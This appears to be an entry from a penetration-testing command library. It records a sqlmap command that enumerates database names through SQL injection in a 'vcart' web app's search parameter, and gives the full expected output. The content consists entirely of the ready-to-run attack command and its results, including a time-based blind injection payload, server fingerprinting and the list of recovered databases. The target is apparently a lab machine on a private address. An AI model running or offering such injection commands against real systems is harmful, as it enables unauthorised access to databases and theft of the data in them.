---
id: 5b7e7c99-d609-4604-8e7c-eba0aade6c80
name: SQLMap Command to Reveal Database Names
type: command
executor: ''
data: sqlmap -u 'http://192.168.43.68/vcart/search.php?term=' --dbs
output: "        ___\n       __H__\n ___ ___[']_____ ___ ___  {1.2.7#stable}\n|_ -|\
  \ . [']     | .'| . |\n|___|_  [(]_|_|_|__,|  _|\n      |_|V          |_|   http://sqlmap.org\n\
  \n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual\
  \ consent is illegal. It is the end user's responsibility to obey all applicable\
  \ local, state and federal laws. Developers assume no liability and are not responsible\
  \ for any misuse or damage caused by this program\n\n[*] starting at 22:34:01\n\n\
  [22:34:01] [WARNING] provided value for parameter 'term' is empty. Please, always\
  \ use only valid parameter values so sqlmap could be able to run properly\n[22:34:01]\
  \ [INFO] resuming back-end DBMS 'mysql' \n[22:34:01] [INFO] testing connection to\
  \ the target URL\nsqlmap got a 302 redirect to 'http://192.168.43.68:80/vcart/login.php'.\
  \ Do you want to follow? [Y/n] y\nsqlmap resumed the following injection point(s)\
  \ from stored session:\n---\nParameter: term (GET)\n    Type: AND/OR time-based\
  \ blind\n    Title: MySQL >= 5.0.12 AND time-based blind\n    Payload: term=%' AND\
  \ SLEEP(5) AND '%'='\n---\n[22:34:03] [INFO] the back-end DBMS is MySQL\nweb application\
  \ technology: Apache 2.4.41, PHP 7.1.32\nback-end DBMS: MySQL >= 5.0.12\n[22:34:03]\
  \ [INFO] fetching database names\n[22:34:03] [INFO] fetching number of databases\n\
  [22:34:03] [INFO] resumed: 11\n[22:34:03] [INFO] resumed: information_schema\n[22:34:03]\
  \ [INFO] resumed: vjdb\n[22:34:03] [INFO] resumed: ads\n"
created_at: '2020-08-19T17:15:14.171503+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# SQLMap Command to Reveal Database Names

```bash
sqlmap -u 'http://192.168.43.68/vcart/search.php?term=' --dbs
```

## Expected Output

```
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.2.7#stable}
|_ -| . [']     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 22:34:01

[22:34:01] [WARNING] provided value for parameter 'term' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[22:34:01] [INFO] resuming back-end DBMS 'mysql' 
[22:34:01] [INFO] testing connection to the target URL
sqlmap got a 302 redirect to 'http://192.168.43.68:80/vcart/login.php'. Do you want to follow? [Y/n] y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: term (GET)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: term=%' AND SLEEP(5) AND '%'='
---
[22:34:03] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.41, PHP 7.1.32
back-end DBMS: MySQL >= 5.0.12
[22:34:03] [INFO] fetching database names
[22:34:03] [INFO] fetching number of databases
[22:34:03] [INFO] resumed: 11
[22:34:03] [INFO] resumed: information_schema
[22:34:03] [INFO] resumed: vjdb
[22:34:03] [INFO] resumed: ads

```


